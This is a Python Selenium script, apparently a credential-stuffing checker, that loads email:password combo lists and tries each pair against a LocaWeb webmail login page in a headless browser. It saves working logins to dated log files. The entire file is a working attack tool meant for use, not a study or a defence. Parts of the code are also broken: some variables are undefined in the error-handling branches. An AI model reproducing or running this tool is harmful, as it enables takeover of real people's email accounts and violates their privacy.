import os
from time import sleep
from datetime import datetime
from print_color import print
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
def ReadDBChecking():
    '''
        1-) Leitura da DB e fazer as limpeza separado [ E-mail | Password ]
        2-) Nos caminho [ ./db/log/ ] 
    '''
    dirs = os.listdir("./db/log/")
    return_db = []
    for name_dir in dirs:
        with open(f"./db/log/{name_dir}") as file:
            counts = len(file.readline())
            count = 0
            for line in file:
                date = datetime.today().strftime('%Y/%m/%d | %H:%M:%S')
                count = count + 1
                try:
                    lines =  line.rstrip().split(":")
                    if(len(lines)==2):
                        email = lines[0]
                        password = lines[1]
                        if(email.find("@")!=-1):
                            print(f"<|> E-MAIL: {email} | PASSWORD: {password} <|> [ @Antraz | "+date+" ] ", tag=' READ | 200 | LOCAWEB ', tag_color='blue', color='blue' ,background='blue')
                            return_db.append(f"{email}|{password}")
                except:
                    lines =  line.rstrip().split("|")
                    if(len(lines)==2):
                        email = lines[0]
                        password = lines[1]
                        if(email.find("@")!=-1):
                            print(f"<|> E-MAIL: {email} | PASSWORD: {password} <|> [ @Antraz | "+date+" ] ", tag=' READ | 200 | LOCAWEB ', tag_color='blue', color='blue' ,background='blue')
                            return_db.append(f"{email}|{password}")
    else:
        return return_db
def CheckingAPI():
    '''
        1-) Primeiramente Fazer o Checking de login. [ LocaWeb ]
        2-) Realizar forma responsibility em mobile.
        3-) Salvar os login e Logs [ ./key/log/ | ./key/err/ ]
    '''
    mobile_emulation = {
        "deviceMetrics": { "width": 375, "height": 812, "pixelRatio": 3.0 },
        "userAgent": "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19"
    }
    chrome_options = Options()
    chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://webmail-seguro.com.br/")
    ReadDBChecks = ReadDBChecking()
    for ReadDB in ReadDBChecks:
        ReadDB =  ReadDB.rstrip().split("|")
        email = ReadDB[0]
        password = ReadDB[1]
        driver.find_element(By.XPATH, '//*[@id="rcmloginuser"]').send_keys(email)
        driver.find_element(By.XPATH, '//*[@id="rcmloginpwd"]').send_keys(password)
        driver.find_element(By.XPATH, '//*[@id="loginButton"]/input').click()            
        try:
            checking = driver.find_element(By.XPATH, '//*[@id="nameLabel"]').text
            if(checking==email):
                sleep(5)
                date = datetime.today().strftime('%Y/%m/%d | %H:%M:%S')
                checking = driver.find_element(By.XPATH, '/html/body/div[3]/a').click()
                # ! Save for file in [ ./Key/Log.txt]
                date_file = datetime.today().strftime('%Y/%m/%d|%H:%M:%S')
                date_dir = datetime.today().strftime('%d_%m_%Y')
                directory = f"./key/{date_dir}"
                directory_err = f"./key/{date_dir}/err"
                directory_log = f"./key/{date_dir}/log"
                directory_db = f"./key/{date_dir}/db"
                if not os.path.exists(directory):
                    os.makedirs(directory)
                if not os.path.exists(directory_db):
                    os.makedirs(directory_err)
                    os.makedirs(directory_log)
                    os.makedirs(directory_db)
                    os.makedirs(directory_debug)
                with open(f"{directory_db}/log.txt", "a+") as f:
                    f.write(f"{email}|{password}|{date_file}\n")
                with open(f"{directory_log}/log.txt", "a+") as f:
                    f.write(f"{email}|{password}|{date_file}\n")
                print(f"<|> E-MAIL: {email} | PASSWORD: {password} <|> [ @Antraz | "+date+" ] ", tag=' CHECKING | 200 | LOCAWEB ', tag_color='green', color='green' ,background='green')
        except:
            date = datetime.today().strftime('%Y/%m/%d | %H:%M:%S')
            date_file = datetime.today().strftime('%Y/%m/%d|%H:%M:%S')
            date_dir = datetime.today().strftime('%d_%m_%Y')
            directory = f"./key/{date_dir}"
            directory_err = f"./key/{date_dir}/err"
            directory_log = f"./key/{date_dir}/log"
            directory_debug = f"./key/{date_dir}/debug"
            if not os.path.exists(directory):
                os.makedirs(directory)
            if not os.path.exists(directory_err):
                os.makedirs(directory_err)
                os.makedirs(directory_log)
                os.makedirs(directory_debug)
            with open(f"{directory_err}/log.txt", "a+") as f:
                f.write(f"{email}|{password}|{date_file}\n")
            with open(f"{directory_log}/log.txt", "a+") as f:
                f.write(f"{email}|{password}|{date_file}\n")
            print(f"<|> E-MAIL: {email} | PASSWORD: {password} <|> [ @Antraz | "+date+" ] ", tag=' CHECKING | 400 | LOCAWEB ', tag_color='yellow', color='yellow' ,background='yellow')
        sleep(1.5)
def API():
    try:
        CheckingAPI()
    except:
        date = datetime.today().strftime('%Y/%m/%d | %H:%M:%S')
        date_file = datetime.today().strftime('%Y/%m/%d|%H:%M:%S')
        date_dir = datetime.today().strftime('%d_%m_%Y')
        directory = f"./key/{date_dir}"
        directory_err = f"./key/{date_dir}/err"
        directory_log = f"./key/{date_dir}/log"
        directory_debug = f"./key/{date_dir}/debug"
        if not os.path.exists(directory):
            os.makedirs(directory)
        if not os.path.exists(directory_debug):
            os.makedirs(directory_debug)
            os.makedirs(directory_log)
            os.makedirs(directory_err)
        with open(f"{directory_debug}/log.txt", "a+") as f:
            f.write(f"{email}|{password}|{date_file}\n")
        print(f"<|> E-MAIL: {email} | PASSWORD: {password} <|> [ @Antraz | "+date+" ] ", tag=' CHECKING | ERROR | LOCAWEB ', tag_color='red', color='red' ,background='red')
        sleep(1.5)
API()